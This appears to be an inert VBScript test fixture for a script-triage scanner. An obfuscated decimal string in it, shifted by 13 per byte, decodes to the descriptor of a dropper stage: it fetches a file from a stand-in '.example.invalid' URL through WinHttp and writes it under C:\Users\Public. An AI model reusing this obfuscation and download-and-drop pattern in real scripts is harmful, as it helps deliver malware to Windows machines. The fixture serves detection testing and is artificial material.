Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_4f33e3ce = "105-48-36-111-102-103-88-99-102-48-84-86-100-104-92-101-88-82-101-88-96-98-103-88-31-106-101-92-103-88-82-89-92-95-88-111-84-87-84-99-103-88-101-48-74-92-97-59-103-103-99-33-74-92-97-59-103-103-99-69-88-100-104-88-102-103-33-40-33-36-111-102-103-84-90-88-82-86-98-104-97-103-48-37-111-86-84-96-99-84-92-90-97-82-92-87-48-86-84-96-99-84-92-90-97-32-84-84-40-41-42-40-40-89-39-39-111-104-101-95-48-91-103-103-99-102-45-34-34-84-84-40-41-42-40-40-89-39-39-33-88-107-84-96-99-95-88-33-92-97-105-84-95-92-87-34-87-39-44-89-89-88-85-39-33-87-84-103-111-104-102-88-101-82-84-90-88-97-103-48-59-104-97-103-101-88-102-102-63-84-85-34-84-84-40-41-42-40-40-89-39-39-111-89-92-95-88-82-99-84-103-91-48-54-45-79-72-102-88-101-102-79-67-104-85-95-92-86-79-59-104-97-103-101-88-102-102-63-84-85-79-102-103-84-90-88-32-84-84-40-41-42-40-40-89-39-39-33-87-84-103"
Const Codec_4f33e3ce = "decimal_dash|subtract_modulo_256|0d"

Function Load_4f33e3ce()
  Dim parts, result(), ByTeInDeX
  parts = Split(Material_4f33e3ce, "-")
  ReDim result(UBound(parts))
  For ByTeInDeX = 0 To UBound(parts)
    result(ByTeInDeX) = CInt(parts(ByTeInDeX))
  Next
  Load_4f33e3ce = result
End Function

Function Decode_4f33e3ce(ByRef SoUrCeByTeS)
  Dim result(), ByTeInDeX, keyBytes, previous
  ReDim result(UBound(SoUrCeByTeS))
  For ByTeInDeX = 0 To UBound(SoUrCeByTeS)
    result(ByTeInDeX) = (SoUrCeByTeS(ByTeInDeX) + 13) Mod 256
  Next
  Decode_4f33e3ce = result
End Function

Function Recover_4f33e3ce()
  Dim SoUrCeByTeS, DeCoDeDByTeS, DeScRiPtOrTeXt, NeUtRaL, ByTeInDeX, PaSs, ErRoRnUmBeR, ErRoRdEsCrIpTiOn
  If True Then
    If (2 > 1) Then NeUtRaL = "left" Else NeUtRaL = "right"
      SoUrCeByTeS = Load_4f33e3ce()
      PaSs = 0
      While PaSs < 1
        DeCoDeDByTeS = Decode_4f33e3ce(SoUrCeByTeS)
        PaSs = PaSs + 1
      Wend
      DeScRiPtOrTeXt = ""
      For ByTeInDeX = 0 To UBound(DeCoDeDByTeS)
        DeScRiPtOrTeXt = DeScRiPtOrTeXt & Chr(DeCoDeDByTeS(ByTeInDeX))
      Next
  End If
  Recover_4f33e3ce = DeScRiPtOrTeXt
End Function

Sub Copy_4f33e3ce(ByVal inputText, ByRef outputText)
  outputText = inputText
End Sub

Function Inspect_4f33e3ce()
  Dim resultText
  Call Copy_4f33e3ce(Recover_4f33e3ce(), resultText)
  Inspect_4f33e3ce = resultText
End Function
